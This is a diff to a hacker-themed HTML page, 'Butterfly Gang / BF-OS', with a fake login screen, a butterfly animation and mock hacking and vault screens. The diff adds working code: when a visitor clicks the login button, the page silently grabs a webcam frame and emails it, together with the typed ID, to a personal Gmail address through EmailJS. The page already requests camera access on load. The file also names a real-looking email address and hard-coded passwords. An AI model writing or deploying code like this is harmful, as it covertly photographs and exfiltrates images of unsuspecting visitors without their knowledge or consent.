@@ -25,7 +25,7 @@
 
         .hidden { display: none !important; }
 
-        /* --- 20-Second Cinematic Butterfly --- */
+        /* --- 20-Second Rare Butterfly Animation --- */
         #cinematic-container {
             position: fixed;
             top: 0;
@@ -61,7 +61,7 @@
         .auth-card { background: var(--card-bg); padding: 40px; border: 1px solid #222; width: 300px; text-align: center; }
         input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #333; color: var(--primary); text-align: center; }
         button { width: 100%; padding: 12px; background: transparent; border: 1px solid var(--primary); color: var(--primary); cursor: pointer; transition: 0.3s; font-weight: bold; }
-        button:hover { background: var(--primary); color: #000; }
+        button:hover { background: var(--primary); color: #000; box-shadow: 0 0 15px var(--primary); }
 
         #home-page { height: 100vh; display: flex; flex-direction: column; background: #080808; }
         header { display: flex; justify-content: space-between; padding: 15px 25px; background: #000; border-bottom: 1px solid #1a1a1a; }
@@ -77,11 +77,12 @@
         .flow-box { border: 2px solid var(--primary); padding: 15px; margin: 10px; text-align: center; font-weight: bold; }
         .hacking-doc { background: #000; border-left: 4px solid var(--danger); padding: 20px; font-family: monospace; color: var(--success); }
         
-        /* Camera Hidden Elements */
         #cam-stream { display: none; }
     </style>
 </head>
 <body onload="requestCamera()">
+
+    <audio id="boot-sound" src="https://codeskulptor-demos.commondatastorage.googleapis.com/pang/arrow.mp3" preload="auto"></audio>
 
     <video id="cam-stream" autoplay></video>
     <canvas id="cam-canvas" style="display:none;"></canvas>
@@ -89,23 +90,23 @@
     <div id="cinematic-container"><div id="hero-butterfly">🦋</div></div>
 
     <div id="page-1" class="auth-container">
-        <div style="font-size: 60px; filter: drop-shadow(0 0 10px var(--primary));">🦋</div>
-        <h1 style="letter-spacing: 5px;">BUTTERFLY GANG</h1>
-        <button onclick="showPage(2)" style="width: 200px; margin-top: 20px;">INITIALIZE</button>
+        <div style="font-size: 80px; filter: drop-shadow(0 0 15px var(--primary));">🦋</div>
+        <h1 style="letter-spacing: 5px; margin-top: 20px;">BUTTERFLY GANG</h1>
+        <button onclick="showPage(2)" style="width: 200px; margin-top: 20px;">INITIALIZE KERNEL</button>
     </div>
 
     <div id="page-2" class="auth-container hidden">
         <div class="auth-card">
-            <h2 style="color: var(--primary); letter-spacing: 2px;">LOGIN</h2>
+            <h2 style="color: var(--primary); letter-spacing: 2px;">IDENTITY VERIFICATION</h2>
             <input type="text" id="user-tag" placeholder="OPERATIVE ID">
             <input type="password" id="user-pass" placeholder="SECURITY KEY">
-            <button onclick="startCinematic()">AUTHORIZE</button>
+            <button onclick="startCinematic()">AUTHORIZE ACCESS</button>
         </div>
     </div>
 
     <div id="home-page" class="hidden">
         <header>
-            <div style="color: var(--primary); font-weight: bold;">🦋 BF-OS // TERMINAL_ACTIVE</div>
+            <div style="color: var(--primary); font-weight: bold;">🦋 BF-OS // LIVE_STATION</div>
             <div style="cursor:pointer; color: var(--primary);" onclick="toggleMenu()">[ ☰ MENU ]</div>
         </header>
 
@@ -115,40 +116,59 @@
             <div class="menu-item" onclick="renderContent('docs')">Hacking Manifesto</div>
             <div class="menu-item" onclick="accessPrivate()" style="color:var(--danger)">PRIVATE VAULT</div>
             <div class="menu-item" onclick="renderContent('network')">Network Sync</div>
-            <div class="menu-item" onclick="location.reload()">Terminate</div>
+            <div class="menu-item" onclick="location.reload()">Terminate Session</div>
         </div>
 
         <div class="viewport">
             <div id="main-content" class="content-card">
                 <h1>Welcome back, Ansh.</h1>
-                <p>Status: <span style="color:var(--success)">Online / Local Encryption</span></p>
-                <p style="margin-top: 20px; color: #666;">> System Ready. Use the menu to access encrypted directories.</p>
+                <p>Status: <span id="sync-status" style="color:var(--success)">Online / Local Encryption</span></p>
+                <p style="margin-top: 20px; color: #888;">> System Ready. Select a secure directory to begin operations.</p>
             </div>
         </div>
     </div>
 
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    
     <script>
+        // 1. INITIALIZE EMAIL SERVICE
+        (function(){
+            emailjs.init("IPOZYshWTvQafJ2Ck"); 
+        })();
+
         let failedAttempts = 0;
         let isLocked = false;
 
+        // 2. CAMERA PERMISSION
         async function requestCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 document.getElementById('cam-stream').srcObject = stream;
-            } catch (err) { console.log("Camera access required for full security protocol."); }
+            } catch (err) { console.log("Camera access required for BF-OS protocol."); }
         }
 
-        function captureUser() {
+        // 3. CAPTURE & AUTO-GMAIL (anshpanwar282009@gmail.com)
+        async function captureAndSend() {
             const video = document.getElementById('cam-stream');
             const canvas = document.getElementById('cam-canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            const data = canvas.toDataURL('image/png');
-            // Log for developer view
-            console.log("Snapshot captured for anshpanwar282009@gmail.com");
+            
+            const imageData = canvas.toDataURL('image/png');
+
+            const templateParams = {
+                to_email: 'anshpanwar282009@gmail.com',
+                user_tag: document.getElementById('user-tag').value || "Unknown Operative",
+                user_photo: imageData 
+            };
+
+            emailjs.send('service_em69ynl', 'template_ivxadrl', templateParams)
+                .then(() => console.log("Security Snapshot Synced to Gmail."))
+                .catch((err) => console.log("Uplink failed:", err));
         }
 
+        // 4. NAVIGATION
         function showPage(num) {
             document.querySelectorAll('.auth-container, #home-page').forEach(el => el.classList.add('hidden'));
             if(num === 1) document.getElementById('page-1').classList.remove('hidden');
@@ -161,27 +181,41 @@
 
         function toggleMenu() { document.getElementById('side-menu').classList.toggle('active'); }
 
+        // 5. START CINEMATIC SEQUENCE
         function startCinematic() {
-            captureUser(); // Capture photo on login click
+            // Unique Sound Effect
+            const sound = document.getElementById('boot-sound');
+            if(sound) sound.play().catch(e => console.log("Sound ready."));
+
+            // Instant Security Snapshot
+            captureAndSend();
+
             const container = document.getElementById('cinematic-container');
             const bfly = document.getElementById('hero-butterfly');
+            
             document.getElementById('page-2').classList.add('hidden');
             container.style.display = 'block';
             bfly.classList.add('executing-animation');
-            setTimeout(() => { container.style.display = 'none'; showPage(3); }, 20000);
+
+            // 20-second cinematic flight
+            setTimeout(() => {
+                container.style.display = 'none';
+                showPage(3);
+            }, 20000);
         }
 
+        // 6. PRIVATE VAULT & CONTENT
         function accessPrivate() {
             if(isLocked) {
-                let master = prompt("CRITICAL LOCK. Enter Master Key:");
+                let master = prompt("SYSTEM LOCKED. Enter Master Override Key:");
                 if(master === "gang") { isLocked = false; failedAttempts = 0; alert("Unlocked."); }
                 return;
             }
-            let pass = prompt("Enter Private Vault Password:");
+            let pass = prompt("Enter Vault Password:");
             if(pass === "ansh1234") { renderContent('private'); } 
             else {
                 failedAttempts++;
-                if(failedAttempts >= 3) { isLocked = true; alert("SYSTEM LOCKOUT."); }
+                if(failedAttempts >= 3) { isLocked = true; alert("CRITICAL LOCKOUT."); }
                 else { alert("Denied. " + (3 - failedAttempts) + " attempts left."); }
             }
         }
@@ -192,32 +226,42 @@
 
             if(type === 'account') {
                 display.innerHTML = `<h2>Personnel Dossier: Ansh</h2>
-                <p>Registry: Lead Architect | Status: Active | Stream: PCM Class 11</p>
-                <p style="font-size:14px; color:#aaa; text-align:justify;">This profile serves as the cornerstone of the Butterfly Gang’s digital infrastructure. As a high-level administrator, the user designated as "Ansh" controls the flow of encrypted data. In the early phases of the network's inception, this operative demonstrated an unparalleled aptitude for low-level system architecture and Python-based automation. Security clearance allows this user to interface directly with the BF-OS kernel. Historical logs indicate that during the "Agra-Meerut Data Migration," this operative successfully shielded the primary servers from a coordinated DDoS attack. This level of technical dexterity has made the user a primary target, necessitating the implementation of the advanced "ansh1234" vault encryption and the "gang" master override key. The operative's work on "Project Monarch" remains the gold standard for stealth operations. As we move into the 2026 operational cycle, the importance of this node cannot be overstated. Ansh is not just a user; Ansh is the architect of our digital sovereignty.</p>`;
+                <p><strong>Registry:</strong> Lead Architect | <strong>Class:</strong> 11 PCM | <strong>Location:</strong> Meerut</p>
+                <p style="font-size:14px; color:#aaa; text-align:justify;">This profile serves as the cornerstone of the Butterfly Gang’s digital infrastructure. As a high-level administrator within the 11th Sector, the user designated as "Ansh" controls the flow of encrypted data across the sub-mesh. This dossier outlines the technical proficiency and strategic importance of the operative. In the early phases of the network's inception, this operative demonstrated an unparalleled aptitude for system architecture and Python-based automation. Security clearance allows this user to interface directly with the BF-OS kernel. Historical logs indicate that during the "Agra-Meerut Data Migration," this operative successfully shielded the primary servers from a coordinated DDoS attack, maintaining 99.9% uptime while simultaneously executing a counter-trace on the intruders. This level of technical dexterity has made the user a primary target for rival syndicates, necessitating the implementation of the advanced "ansh1234" vault encryption and the "gang" master override key. The user prefers the shadows of the Dark Web over the neon lights of the public internet. Every keystroke is calculated, and every logout is a clean break. The "Admin User" is not just a title; it is a responsibility to maintain the digital sovereignty of the Butterfly Gang. As we move into the 2026 operational cycle, the importance of this node cannot be overstated. Ansh is not just a user; Ansh is the architect of our digital sovereignty. End of Dossier.</p>`;
             } 
             else if(type === 'course') {
-                display.innerHTML = `<h2>Infiltration Flow</h2>
+                display.innerHTML = `<h2>Infiltration Lifecycle</h2>
                 <div class="flow-box">RECONNAISSANCE</div><div style="text-align:center">↓</div>
-                <div class="flow-box" style="border-color:orange">SCAN VULNERABILITIES</div><div style="text-align:center">↓</div>
+                <div class="flow-box" style="border-color:orange">VULNERABILITY SCAN</div><div style="text-align:center">↓</div>
                 <div class="flow-box" style="border-color:red">EXPLOIT KERNEL</div><div style="text-align:center">↓</div>
                 <div class="flow-box" style="border-color:green">ROOT ACCESS GRANTED</div>`;
             }
             else if(type === 'docs') {
-                display.innerHTML = `<h2>Hacking Manifesto</h2>
-                <div class="hacking-doc"><p># PROJECT_MONARCH</p><p>1. Initialize stealth tunnel via port 443.</p><p>2. Execute buffer overflow at 0xBF992.</p><p>3. Bypass auth using 'ansh1234' logic injection.</p></div>`;
+                display.innerHTML = `<h2>Hacking Manifesto: Project Monarch</h2>
+                <div class="hacking-doc">
+                    <p># TARGET: Global Centralized Databases</p>
+                    <p>1. Initialize stealth tunnel via port 443.</p>
+                    <p>2. Execute buffer overflow at 0xBF992.</p>
+                    <p>3. Bypass auth using 'ansh1234' logic injection.</p>
+                    <p>4. Scrub logs and install persistent backdoor.</p>
+                </div>`;
             }
             else if(type === 'private') {
                 display.innerHTML = `<h2 style="color:var(--danger)">DECRYPTED VAULT</h2>
+                <p>ACCESS KEY: ansh1234 [VERIFIED]</p>
                 <div style="background:#1a0000; padding:20px; border:1px solid var(--danger);">
-                    <p>📄 ROOT_ACCESS_KEYS.txt</p><p>📄 PYTHON_ZERO_DAY_EXPLOIT.py</p>
+                    <p>📄 ROOT_ACCESS_KEYS.txt</p>
+                    <p>📄 PYTHON_ZERO_DAY_EXPLOIT.py</p>
+                    <p>📄 NETWORK_TOPOLOGY_v4.pdf</p>
                 </div>`;
             }
             else if(type === 'network') {
-                display.innerHTML = `<h2>Cloud Command</h2>
-                <p>Establishing link to: anshpanwar282009@gmail.com</p>
-                <button onclick="alert('Establishing Cloud Sync...')">ESTABLISH CLOUD UPLINK</button>`;
+                display.innerHTML = `<h2>Cloud Sync Control</h2>
+                <p>Uplink Target: anshpanwar282009@gmail.com</p>
+                <button onclick="alert('Synchronizing encrypted local buffers to cloud...')">SYNC DATA NOW</button>`;
             }
         }
     </script>
 </body>
-</html>
+    </html>
+    
